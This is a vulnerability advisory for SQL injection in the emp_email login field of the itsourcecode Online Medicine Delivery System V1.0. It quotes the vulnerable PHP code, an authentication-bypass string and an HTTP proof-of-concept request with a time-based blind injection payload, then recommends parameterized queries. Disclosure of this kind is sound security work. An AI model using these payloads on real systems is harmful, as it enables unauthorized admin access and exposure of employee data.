# itsourcecode Online Medicine Delivery System V1.0 SQL Injection Vulnerability via 'emp_email' Parameter in '/rider/login.php'
---

## 1. Product Information
| Field | Value |
| --- | --- |
| **Product Name** | Online Medicine Delivery System |
| **Product Link** | [https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/](https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/) |
| **Vendor** | itsourcecode |
| **Affected Version** | V1.0 |
| **Authentication Required** | No, exploitable without any authentication |


## 2. Vulnerability Type
**SQL Injection**

---

## 3. Vulnerability Description
The rider/admin backend login interface `/rider/login.php` of Online Medicine Delivery System contains an SQL injection vulnerability. The interface receives the user-submitted `emp_email` parameter and directly concatenates it into an SQL query string without any filtering or parameterization, which is then passed to the `Employee::employeeAuthentication()` method for execution.

An attacker can construct a malicious SQL statement in the `emp_email` field (e.g., `' OR 1=1-- -`), making the WHERE condition of the authentication query always true, and using a comment delimiter to bypass password verification, thereby successfully authenticating without knowing any account credentials and obtaining a backend admin session. This vulnerability can be exploited without any prior authentication.

**Affected Code**:

`include/employee.php:25-27`

```php
static function employeeAuthentication($email,$h_password){
    global $mydb;
    $mydb->setQuery("SELECT * FROM `tblemployee` WHERE `EMAIL` = '". $email ."' and `PASSWORD` = '". $h_password ."'");
```

`rider/login.php:95-108`

```php
$emp_email = trim($_POST['emp_email']);
$emp_pass  = trim($_POST['emp_pass']);
$h_emppass = sha1($emp_pass);
// ...
$res = $employee::employeeAuthentication($emp_email, $h_emppass);
```

---

## 4. Impact
+ **Unauthorized Backend Access**: An attacker can log into the backend management system without knowing any employee credentials, obtaining admin-level operational privileges
+ **Sensitive Data Disclosure**: Upon successful login, the system writes the employee's full information (name, email, address, contact details, password hash, etc.) into the session, which the attacker can directly access through the backend pages
+ **Business Data Tampering**: After entering the backend, the attacker can add, modify, or delete order statuses, employee information, product data, etc.

---

## 5. PoC
```plain
POST /rider/login.php HTTP/1.1
Host: onlinemedicinedeliverysystem:9715
Content-Type: application/x-www-form-urlencoded
Connection: close
btnLogin=1&emp_email=test' AND (SELECT 9451 FROM (SELECT(SLEEP(5)))pIcV)-- GOaF&emp_pass=test
```

sqlmap execution screenshot:

![image-20260716192513822](C:\Users\Shawn\AppData\Roaming\Typora\typora-user-images\image-20260716192513822.png)



![image-20260716192526408](C:\Users\Shawn\AppData\Roaming\Typora\typora-user-images\image-20260716192526408.png)

## 6. Remediation
1. **Use Parameterized Queries**
2. **Input Validation**: Perform whitelist validation on user input before SQL execution; for example, the email field should be verified against a valid email format

